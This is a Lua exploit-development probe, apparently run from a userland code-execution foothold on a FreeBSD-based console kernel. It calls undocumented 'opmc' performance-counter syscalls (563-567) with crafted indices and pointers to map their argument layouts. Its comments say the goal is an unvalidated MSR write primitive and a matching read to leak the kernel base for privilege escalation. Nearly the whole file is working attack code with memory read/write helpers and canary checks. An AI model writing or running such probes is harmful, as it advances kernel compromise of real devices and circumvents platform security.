-- CRASH_CLASS: MODERATE
-- PROBE 177b: establish the opmc argument layouts (563-567)
--
-- The 13.60 sysent capture names this block, and the names change everything:
--
--   563 opmc_enable   564 opmc_disable   565 opmc_set_ctl
--   566 opmc_set_ctr  567 opmc_get_ctr        (568-571 budget_*, absent)
--   561 suspend_process, 562 resume_process   (both absent)
--
-- opmc is AMD's performance-monitoring-counter interface, and on FreeBSD it is
-- an MSR read/write path. The sweeps already showed 563-566 return 0 to zeroed
-- arguments while 567 rejects them, which matches "enable, then control, then
-- read back by index". If set_ctl/set_ctr reach the MSR file with an index the
-- handler does not validate, they are an MSR write primitive, and get_ctr would
-- be the matching read - which is a kernel base leak.
--
-- This probe only uses opmc-shaped indices (0-7, the PMC MSR slots). It does not
-- touch a dangerous MSR yet: first find the layout, then confirm a write lands,
-- and only then ask whether the index is validated. Every call is followed by a
-- canary so a death is unambiguous.

print("=== PROBE 177b: OPMC LAYOUT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return -1
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end

local sc20 = make_syscall(20)
local sc477 = make_syscall(477)
print("[0] canary pid=" .. tostring(to_num(sc20())))

local page = sc477(uint64(0), uint64(0x8000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print("[0] page=" .. string.format("0x%X", to_num(page)))

local MARK = 0xA5A5A5A5
local function fill(n) for off = 0, n - 4, 4 do wd(page + off, MARK) end end
local function scan(n)
    local changed, first, fval = 0, -1, 0
    for off = 0, n - 4, 4 do
        local v = rd(page + off)
        if v ~= MARK then
            changed = changed + 1
            if first < 0 then first, fval = off, v end
        end
    end
    return changed, first, fval
end

local function call(label, num, a1, a2, a3)
    local sc = make_syscall(num)
    fill(0x1000)
    local ok, rv = pcall(function()
        return sc(uint64(a1), uint64(a2), uint64(a3), uint64(0), uint64(0), uint64(0))
    end)
    local hi, lo = 0, 0
    if ok then hi, lo = get_hi_lo(rv) end
    local changed, off, val = scan(0x1000)
    print(string.format("  %-22s sys=%d a=(%s,%s,%s) ok=%s ret=0x%08X%08X chg=%d@%d:0x%08X",
        label, num, tostring(a1), tostring(a2), tostring(a3), tostring(ok), hi, lo,
        changed, off, val))
    return lo
end

-- [1] the sequence that the sweeps implied: enable, control, read back.
compat = call("enable(0)", 563, 0, 0, 0)
call("enable(1)", 563, 1, 0, 0)
call("enable(page,0x400)", 563, page, 0x400, 0)

-- [2] set_ctl / set_ctr: does an index+value pair get accepted?
for idx = 0, 7 do
    call("set_ctl idx=" .. idx, 565, idx, 1, 0)
end
for idx = 0, 7 do
    call("set_ctr idx=" .. idx, 566, idx, 1, 0)
end

-- [3] get_ctr: try the layouts that could write a value out.
call("get(idx,ptr)", 567, 0, page, 0)
call("get(ptr,idx)", 567, page, 0, 0)
call("get(idx)", 567, 0, 0, 0)
call("get(idx,val)", 567, 0, 1, 0)
call("get(idx,0,ptr)", 567, 0, 0, page)

print("[3] canary pid=" .. tostring(to_num(sc20())))

-- [4] write a recognisable value through set_ctr, then read the word back with
-- get_ctr in every layout above. A value that equals what was written proves the
-- pair is a counter write and a counter read, which is the MSR shape.
call("set_ctr idx=0 val=0x5EA1", 566, 0, 0x5EA1, 0)
local got = rq(page)
print("[4] after set_ctr, page[0]=" .. (got and string.format("0x%X", to_num(got)) or "nil"))
call("get(idx,ptr) again", 567, 0, page, 0)
got = rq(page)
print("[4] page[0] now=" .. (got and string.format("0x%X", to_num(got)) or "nil"))
print("=== PROBE 177b DONE ===")
